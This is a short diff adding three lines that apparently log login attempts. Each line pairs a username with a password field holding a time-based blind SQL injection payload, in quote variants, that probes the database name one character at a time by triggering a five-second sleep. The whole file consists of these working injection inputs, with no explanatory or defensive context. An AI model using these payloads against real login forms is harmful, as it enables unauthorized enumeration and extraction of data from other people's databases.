@@ -1,0 +1,3 @@
+User Name:gegePassword:1" or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gegegePassword:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gegeegPassword:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
